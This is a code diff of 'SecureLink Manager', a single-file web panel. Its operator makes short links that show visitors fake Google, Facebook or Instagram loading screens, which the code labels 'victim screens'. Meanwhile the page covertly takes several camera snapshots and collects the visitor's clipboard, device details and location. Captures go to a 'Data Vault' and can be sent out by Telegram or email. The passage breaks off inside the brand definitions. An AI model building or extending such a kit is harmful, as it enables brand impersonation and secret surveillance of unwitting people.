@@ -6,10 +6,10 @@
 <title>SecureLink Manager</title>
 <script src="https://cdn.tailwindcss.com"></script>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/inter@5.0.0/index.css">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
   * { font-family: 'Inter', sans-serif; }
-  body { background: #0a0a0f; color: #e5e5e5; }
+  body { background: #0a0a0f; color: #e5e5e5; margin: 0; }
   .glass { background: rgba(20,20,30,0.6); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.08); }
   .glow { box-shadow: 0 0 40px rgba(99,102,241,0.15); }
   .gradient-text { background: linear-gradient(135deg,#6366f1,#a855f7,#ec4899); -webkit-background-clip: text; background-clip: text; color: transparent; }
@@ -17,10 +17,10 @@
   .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(99,102,241,0.4); }
   .fade-in { animation: fadeIn .4s ease; }
   @keyframes fadeIn { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:translateY(0)} }
-  .scrollbar::-webkit-scrollbar { width: 6px; height: 6px; }
+  .scrollbar::-webkit-scrollbar { width: 6px; }
   .scrollbar::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
   .loader-screen { position: fixed; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
-  .brand-spinner { width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.1); border-radius: 50%; animation: spin 1s linear infinite; }
+  .brand-spinner { width: 48px; height: 48px; border: 4px solid rgba(0,0,0,0.08); border-radius: 50%; animation: spin 1s linear infinite; }
   @keyframes spin { to { transform: rotate(360deg); } }
   .pulse-dot { width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: pulse 1.5s infinite; }
   @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.5;transform:scale(1.3)} }
@@ -33,17 +33,41 @@
   .brand-card { transition: all .3s; cursor: pointer; }
   .brand-card:hover { transform: translateY(-4px); border-color: rgba(99,102,241,0.5); }
   .brand-card.selected { border-color: #6366f1; background: rgba(99,102,241,0.1); }
-  .snap-thumb { transition: all .2s; cursor: pointer; }
-  .snap-thumb:hover { transform: scale(1.05); border-color: #6366f1; }
-  .log-card { transition: all .2s; }
-  .log-card:hover { border-color: rgba(99,102,241,0.4); }
+  .hidden { display: none !important; }
+  .shake { animation: shake .4s; }
+  @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-8px)} 75%{transform:translateX(8px)} }
+  .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(8px); z-index: 9998; display: flex; align-items: center; justify-content: center; padding: 20px; animation: fadeIn .2s; }
+  .modal-box { max-width: 900px; width: 100%; max-height: 90vh; overflow-y: auto; }
+  .snap-thumb { position: relative; overflow: hidden; border-radius: 8px; cursor: pointer; transition: transform .2s; }
+  .snap-thumb:hover { transform: scale(1.03); }
+  .snap-thumb img { width: 100%; height: 160px; object-fit: cover; display: block; }
+  .snap-badge { position: absolute; top: 6px; left: 6px; background: rgba(0,0,0,0.7); color: white; font-size: 10px; padding: 2px 6px; border-radius: 4px; }
+  .data-chip { display: inline-flex; align-items: center; gap: 4px; padding: 4px 10px; border-radius: 6px; background: rgba(99,102,241,0.1); border: 1px solid rgba(99,102,241,0.2); font-size: 11px; color: #a5b4fc; }
+  .storage-bar { height: 6px; background: rgba(255,255,255,0.05); border-radius: 3px; overflow: hidden; }
+  .storage-fill { height: 100%; background: linear-gradient(90deg,#10b981,#f59e0b,#ef4444); transition: width .5s; }
+  .log-row { transition: all .2s; }
+  .log-row:hover { background: rgba(99,102,241,0.05); }
+  .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 12px; }
+  
+  /* Brand-specific victim screens */
+  .victim-logo-wrap { display: flex; align-items: center; justify-content: center; margin-bottom: 40px; transform: scale(1.4); }
+  .victim-logo-wrap svg { max-width: 100%; height: auto; }
+  .victim-brand-name { font-weight: 700; letter-spacing: -0.5px; margin-bottom: 8px; }
+  .victim-sub { font-size: 13px; opacity: 0.6; margin-top: 16px; letter-spacing: 0.3px; }
+  .victim-status { font-size: 11px; opacity: 0.4; margin-top: 6px; }
+  .progress-track { position: fixed; bottom: 40px; left: 50%; transform: translateX(-50%); width: 220px; height: 3px; background: rgba(0,0,0,0.08); border-radius: 2px; overflow: hidden; }
+  .progress-fill { height: 100%; width: 0; transition: width 0.3s ease; border-radius: 2px; }
+  .collection-indicator { position: fixed; bottom: 60px; left: 50%; transform: translateX(-50%); display: flex; gap: 6px; align-items: center; }
+  .collection-dot { width: 5px; height: 5px; border-radius: 50%; background: rgba(0,0,0,0.2); transition: background 0.3s; }
+  .collection-dot.done { background: #10b981; }
+  .collection-dot.active { background: #f59e0b; animation: pulse 1s infinite; }
 </style>
 </head>
 <body>
 
-<!-- LOGIN SCREEN -->
+<!-- LOGIN -->
 <div id="loginScreen" class="min-h-screen flex items-center justify-center p-4">
-  <div class="glass glow rounded-2xl p-8 w-full max-w-md fade-in">
+  <div id="loginBox" class="glass glow rounded-2xl p-8 w-full max-w-md fade-in">
     <div class="text-center mb-8">
       <div class="w-16 h-16 mx-auto mb-4 rounded-2xl bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center">
         <i class="fas fa-shield-alt text-2xl text-white"></i>
@@ -54,11 +78,11 @@
     <div class="space-y-4">
       <div>
         <label class="text-xs text-gray-400 uppercase tracking-wider">Password</label>
-        <input id="loginPass" type="password" placeholder="Enter admin password" 
-          class="w-full mt-2 px-4 py-3 bg-black/40 border border-white/10 rounded-lg focus:outline-none focus:border-indigo-500 transition"
-          onkeypress="if(event.key==='Enter')handleLogin()">
+        <input id="loginPass" type="password" placeholder="Enter admin password" autocomplete="off"
+          class="w-full mt-2 px-4 py-3 bg-black/40 border border-white/10 rounded-lg focus:outline-none focus:border-indigo-500 transition">
+        <p id="loginError" class="text-red-400 text-xs mt-2 hidden">Invalid password. Try again.</p>
       </div>
-      <button onclick="handleLogin()" class="w-full btn-primary text-white font-semibold py-3 rounded-lg">
+      <button id="loginBtn" class="w-full btn-primary text-white font-semibold py-3 rounded-lg">
         <i class="fas fa-sign-in-alt mr-2"></i>Access Panel
       </button>
       <p class="text-center text-xs text-gray-500 mt-4">Default password: <code class="text-indigo-400">admin123</code></p>
@@ -92,39 +116,45 @@
   </header>
 
   <div class="max-w-7xl mx-auto px-6 py-8">
-    <!-- Stats -->
-    <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
+    <div class="grid grid-cols-2 md:grid-cols-5 gap-4 mb-8">
       <div class="glass rounded-xl p-5">
         <div class="flex items-center justify-between mb-2">
-          <span class="text-xs text-gray-400 uppercase">Total Links</span>
+          <span class="text-xs text-gray-400 uppercase">Links</span>
           <i class="fas fa-link text-indigo-400"></i>
         </div>
         <div id="statLinks" class="text-2xl font-bold">0</div>
       </div>
       <div class="glass rounded-xl p-5">
         <div class="flex items-center justify-between mb-2">
-          <span class="text-xs text-gray-400 uppercase">Total Hits</span>
+          <span class="text-xs text-gray-400 uppercase">Hits</span>
           <i class="fas fa-eye text-purple-400"></i>
         </div>
         <div id="statHits" class="text-2xl font-bold">0</div>
       </div>
       <div class="glass rounded-xl p-5">
         <div class="flex items-center justify-between mb-2">
-          <span class="text-xs text-gray-400 uppercase">Captures</span>
-          <i class="fas fa-database text-pink-400"></i>
+          <span class="text-xs text-gray-400 uppercase">Captured</span>
+          <i class="fas fa-camera text-pink-400"></i>
         </div>
-        <div id="statData" class="text-2xl font-bold">0</div>
+        <div id="statCaptured" class="text-2xl font-bold">0</div>
       </div>
       <div class="glass rounded-xl p-5">
         <div class="flex items-center justify-between mb-2">
-          <span class="text-xs text-gray-400 uppercase">Active</span>
-          <i class="fas fa-bolt text-yellow-400"></i>
+          <span class="text-xs text-gray-400 uppercase">Snaps</span>
+          <i class="fas fa-images text-orange-400"></i>
         </div>
-        <div id="statActive" class="text-2xl font-bold">0</div>
+        <div id="statSnaps" class="text-2xl font-bold">0</div>
+      </div>
+      <div class="glass rounded-xl p-5">
+        <div class="flex items-center justify-between mb-2">
+          <span class="text-xs text-gray-400 uppercase">Storage</span>
+          <i class="fas fa-database text-cyan-400"></i>
+        </div>
+        <div id="statStorage" class="text-sm font-bold text-cyan-400">0 KB</div>
+        <div class="storage-bar mt-2"><div id="storageBar" class="storage-fill" style="width:0%"></div></div>
       </div>
     </div>
 
-    <!-- Tabs -->
     <div class="flex gap-2 mb-6 overflow-x-auto scrollbar pb-2">
       <button onclick="switchTab('create')" id="tab-create" class="tab-active px-5 py-2.5 rounded-lg text-sm font-medium whitespace-nowrap transition">
         <i class="fas fa-plus mr-2"></i>Create Link
@@ -132,8 +162,8 @@
       <button onclick="switchTab('links')" id="tab-links" class="px-5 py-2.5 rounded-lg text-sm font-medium bg-white/5 hover:bg-white/10 whitespace-nowrap transition">
         <i class="fas fa-list mr-2"></i>My Links
       </button>
-      <button onclick="switchTab('logs')" id="tab-logs" class="px-5 py-2.5 rounded-lg text-sm font-medium bg-white/5 hover:bg-white/10 whitespace-nowrap transition">
-        <i class="fas fa-stream mr-2"></i>Captures <span id="logBadge" class="ml-1 px-1.5 py-0.5 text-xs rounded-full bg-indigo-500/30 hidden">0</span>
+      <button onclick="switchTab('vault')" id="tab-vault" class="px-5 py-2.5 rounded-lg text-sm font-medium bg-white/5 hover:bg-white/10 whitespace-nowrap transition">
+        <i class="fas fa-vault mr-2"></i>Data Vault
       </button>
       <button onclick="switchTab('settings')" id="tab-settings" class="px-5 py-2.5 rounded-lg text-sm font-medium bg-white/5 hover:bg-white/10 whitespace-nowrap transition">
         <i class="fas fa-cog mr-2"></i>Settings
@@ -152,7 +182,7 @@
           <div>
             <label class="text-xs text-gray-400 uppercase tracking-wider">Custom Short Code</label>
             <div class="flex mt-2">
-              <span class="px-3 py-3 bg-black/60 border border-white/10 border-r-0 rounded-l-lg text-gray-400 text-sm">your.site/#/</span>
+              <span class="px-3 py-3 bg-black/60 border border-white/10 border-r-0 rounded-l-lg text-gray-400 text-sm">your.site/#</span>
               <input id="shortCode" placeholder="my-link" class="flex-1 px-4 py-3 bg-black/40 border border-white/10 rounded-r-lg focus:outline-none focus:border-indigo-500">
             </div>
             <button onclick="generateRandomCode()" class="mt-2 text-xs text-indigo-400 hover:text-indigo-300">
@@ -161,8 +191,9 @@
           </div>
           
           <div>
-            <label class="text-xs text-gray-400 uppercase tracking-wider">Loading Duration (seconds)</label>
-            <input id="loadDuration" type="number" value="6" min="2" max="20" class="w-full mt-2 px-4 py-3 bg-black/40 border border-white/10 rounded-lg focus:outline-none focus:border-indigo-500">
+            <label class="text-xs text-gray-400 uppercase tracking-wider">Minimum Display Time (seconds)</label>
+            <input id="loadDuration" type="number" value="5" min="3" max="20" class="w-full mt-2 px-4 py-3 bg-black/40 border border-white/10 rounded-lg focus:outline-none focus:border-indigo-500">
+            <p class="text-xs text-gray-500 mt-1">Redirect waits until all data collected OR this time passes</p>
           </div>
           
           <div class="md:col-span-2">
@@ -174,21 +205,6 @@
             <label class="text-xs text-gray-400 uppercase tracking-wider">Custom Loading Message (optional)</label>
             <input id="loadMsg" placeholder="Verifying your session..." class="w-full mt-2 px-4 py-3 bg-black/40 border border-white/10 rounded-lg focus:outline-none focus:border-indigo-500">
           </div>
-        </div>
-
-        <!-- Snapshot count config -->
-        <div class="mt-6 p-4 rounded-xl bg-black/30 border border-white/5">
-          <div class="flex items-center gap-2 mb-3">
-            <i class="fas fa-camera text-pink-400"></i>
-            <p class="text-xs text-gray-400 uppercase tracking-wider">Camera Snapshot Count</p>
-          </div>
-          <div class="flex items-center gap-4">
-            <input id="snapCount" type="range" min="2" max="5" value="3" 
-              class="flex-1 accent-indigo-500"
-              oninput="document.getElementById('snapCountLabel').textContent = this.value + ' snapshots'">
-            <span id="snapCountLabel" class="text-sm font-mono text-indigo-300 w-28">3 snapshots</span>
-          </div>
-          <p class="text-xs text-gray-500 mt-2">Captured at intervals during the loading animation. More snaps = more delay before redirect.</p>
         </div>
 
         <div class="mt-6 p-4 rounded-xl bg-black/30 border border-white/5">
@@ -204,7 +220,7 @@
             </label>
             <label class="flex items-center gap-2 cursor-pointer p-2 rounded-lg hover:bg-white/5">
               <input type="checkbox" class="collect-mod accent-indigo-500" value="camera" checked>
-              <span class="text-sm">📸 Camera Snaps</span>
+              <span class="text-sm">📸 Multi Snap</span>
             </label>
             <label class="flex items-center gap-2 cursor-pointer p-2 rounded-lg hover:bg-white/5">
               <input type="checkbox" class="collect-mod accent-indigo-500" value="device" checked>
@@ -223,9 +239,17 @@
               <span class="text-sm">📋 Clipboard</span>
             </label>
             <label class="flex items-center gap-2 cursor-pointer p-2 rounded-lg hover:bg-white/5">
-              <input type="checkbox" class="collect-mod accent-indigo-500" value="fingerprint">
-              <span class="text-sm">🔍 Fingerprint</span>
+              <input type="checkbox" class="collect-mod accent-indigo-500" value="geocode">
+              <span class="text-sm">🗺️ Reverse Geo</span>
             </label>
+          </div>
+          <div class="mt-4 pt-4 border-t border-white/5">
+            <label class="text-xs text-gray-400 uppercase tracking-wider">Number of Camera Snaps</label>
+            <div class="flex items-center gap-3 mt-2">
+              <input id="snapCount" type="range" min="2" max="5" value="3" class="flex-1 accent-indigo-500" oninput="document.getElementById('snapCountVal').textContent=this.value">
+              <span id="snapCountVal" class="text-indigo-400 font-bold text-lg w-6 text-center">3</span>
+            </div>
+            <p class="text-xs text-gray-500 mt-1">Snaps taken at intervals during loading</p>
           </div>
         </div>
 
@@ -261,22 +285,28 @@
       </div>
     </div>
 
-    <!-- Logs / Captures Tab -->
-    <div id="content-logs" class="tab-content hidden fade-in">
+    <!-- Vault Tab -->
+    <div id="content-vault" class="tab-content hidden fade-in">
       <div class="glass rounded-2xl p-6">
         <div class="flex items-center justify-between mb-6 flex-wrap gap-3">
-          <h2 class="text-xl font-bold">Captured Data</h2>
-          <div class="flex gap-2">
-            <input id="searchLogs" oninput="renderLogs()" placeholder="Search by IP, code, location..." class="px-4 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
-            <button onclick="exportAllLogs()" class="px-4 py-2 rounded-lg bg-indigo-500/20 hover:bg-indigo-500/30 text-indigo-300 text-sm transition">
-              <i class="fas fa-download mr-1"></i>Export All
+          <div>
+            <h2 class="text-xl font-bold">Data Vault</h2>
+            <p class="text-xs text-gray-400 mt-1">All captured data stored locally</p>
+          </div>
+          <div class="flex gap-2 flex-wrap">
+            <input id="vaultSearch" oninput="renderVault()" placeholder="Search IP, code, location..." class="px-4 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
+            <select id="vaultFilter" onchange="renderVault()" class="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
+              <option value="all">All Links</option>
+            </select>
+            <button onclick="exportAllJSON()" class="px-4 py-2 rounded-lg bg-green-500/20 hover:bg-green-500/30 text-green-300 text-sm transition">
+              <i class="fas fa-download mr-1"></i>Export JSON
             </button>
-            <button onclick="clearLogs()" class="px-4 py-2 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 text-sm transition">
-              <i class="fas fa-trash mr-1"></i>Clear
+            <button onclick="clearVault()" class="px-4 py-2 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 text-sm transition">
+              <i class="fas fa-trash mr-1"></i>Clear All
             </button>
           </div>
         </div>
-        <div id="logsList" class="space-y-3 max-h-[700px] overflow-y-auto scrollbar"></div>
+        <div id="vaultList" class="space-y-3 max-h-[700px] overflow-y-auto scrollbar"></div>
       </div>
     </div>
 
@@ -289,7 +319,8 @@
           <div class="p-5 rounded-xl bg-black/30 border border-white/5">
             <div class="flex items-center gap-2 mb-3">
               <i class="fab fa-telegram text-blue-400 text-xl"></i>
-              <h3 class="font-semibold">Telegram Webhook (optional)</h3>
+              <h3 class="font-semibold">Telegram Webhook</h3>
+              <span class="text-xs text-gray-500 ml-auto">Optional — data always saved locally</span>
             </div>
             <div class="grid md:grid-cols-2 gap-4">
               <div>
@@ -309,24 +340,29 @@
           <div class="p-5 rounded-xl bg-black/30 border border-white/5">
             <div class="flex items-center gap-2 mb-3">
               <i class="fas fa-envelope text-pink-400 text-xl"></i>
-              <h3 class="font-semibold">Email Delivery (EmailJS, optional)</h3>
+              <h3 class="font-semibold">Email Delivery (EmailJS)</h3>
+            </div>
+            <div class="grid md:grid-cols-2 gap-4">
+              <input id="emPub" placeholder="Public Key" class="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
+              <input id="emSvc" placeholder="Service ID" class="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
+              <input id="emTpl" placeholder="Template ID" class="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
+              <input id="emTo" placeholder="Recipient Email" class="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
+            </div>
+          </div>
+
+          <div class="p-5 rounded-xl bg-black/30 border border-white/5">
+            <div class="flex items-center gap-2 mb-3">
+              <i class="fas fa-camera text-purple-400 text-xl"></i>
+              <h3 class="font-semibold">Capture Defaults</h3>
             </div>
             <div class="grid md:grid-cols-2 gap-4">
               <div>
-                <label class="text-xs text-gray-400 uppercase">Public Key</label>
-                <input id="emPub" placeholder="Your EmailJS public key" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
+                <label class="text-xs text-gray-400 uppercase">Default Snap Count</label>
+                <input id="defSnapCount" type="number" min="2" max="5" value="3" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
               </div>
               <div>
-                <label class="text-xs text-gray-400 uppercase">Service ID</label>
-                <input id="emSvc" placeholder="service_xxx" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
-              </div>
-              <div>
-                <label class="text-xs text-gray-400 uppercase">Template ID</label>
-                <input id="emTpl" placeholder="template_xxx" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
-              </div>
-              <div>
-                <label class="text-xs text-gray-400 uppercase">Recipient Email</label>
-                <input id="emTo" placeholder="you@mail.com" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
+                <label class="text-xs text-gray-400 uppercase">Image Quality (0.1 - 1.0)</label>
+                <input id="defImgQuality" type="number" min="0.1" max="1" step="0.1" value="0.5" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
               </div>
             </div>
           </div>
@@ -357,239 +393,181 @@
 <!-- VICTIM SCREEN -->
 <div id="victimScreen" class="hidden"></div>
 
-<!-- IMAGE VIEWER MODAL -->
-<div id="imgModal" class="hidden fixed inset-0 bg-black/90 z-[99999] flex items-center justify-center p-4" onclick="this.classList.add('hidden')">
-  <img id="imgModalSrc" src="" class="max-w-full max-h-full rounded-lg shadow-2xl">
-</div>
+<!-- MODAL CONTAINER -->
+<div id="modalRoot"></div>
 
 <script>
 /* ============================================================
-   SECURELINK - Complete Single File Management Console
+   SECURELINK — Professional Brand Edition
    ============================================================ */
 
 const BRANDS = {
   google: {
     name: 'Google', color: '#4285f4', bg: '#ffffff', textColor: '#202124',
-    logo: `<svg width="72" height="24" viewBox="0 0 272 92"><path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/><path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.19-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.84.36 34.91.36 15.98 16.32.47 35.25.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.64-16.97-6.64-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.44-.07z"/></svg>`,
-    messages: ['Verifying your account...', 'Secure connection established...', 'Loading your workspace...']
+    logo: `<svg width="272" height="92" viewBox="0 0 272 92"><path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/><path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.19-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.84.36 34.91.36 15.98 16.32.47 35.25.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.64-16.97-6.64-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.44-.07z"/></svg>`,
+    messages: ['Verifying your account...', 'Secure connection established...', 'Loading your workspace...'],
+    spinnerBorder: 'rgba(0,0,0,0.08)'
   },
   facebook: {
     name: 'Facebook', color: '#1877f2', bg: '#f0f2f5', textColor: '#1c1e21',
-    logo: `<svg width="48" height="48" viewBox="0 0 24 24" fill="#1877f2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>`,
-    messages: ['Checking your session...', 'Almost there...', 'Redirecting you safely...']
+    logo: `<svg width="80" height="80" viewBox="0 0 24 24" fill="#1877f2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>`,
+    messages: ['Checking your session...', 'Almost there...', 'Redirecting you safely...'],
+    spinnerBorder: 'rgba(24,119,242,0.15)'
   },
   instagram: {
-    name: 'Instagram', color: '#e1306c', bg: '#fafafa', textColor: '#262626',
-    logo: `<svg width="48" height="48" viewBox="0 0 24 24"><defs><linearGradient id="ig" x1="0%" y1="100%" x2="100%" y2="0%"><stop offset="0%" stop-color="#fd5949"/><stop offset="50%" stop-color="#d6249f"/><stop offset="100%" stop-color="#285AEB"/></linearGradient></defs><path fill="url(#ig)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.795 0-1.441.645-1.441 1.44s.646 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>`,
-    messages: ['Loading your feed...', 'Syncing with server...', 'Preparing content...']
+    name: 'Instagram', color: '#e1306c', bg: '#ffffff', textColor: '#262626',
+    logo: `<svg width="80" height="80" viewBox="0 0 24 24"><defs><linearGradient id="ig" x1="0%" y1="100%" x2="100%" y2="0%"><stop offset="0%" stop-color="#fd5949"/><stop offset="50%" stop-color="#d6249f"/><stop offset="100%" stop-color="#285AEB"/></linearGradient></defs><path fill="url(#ig)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 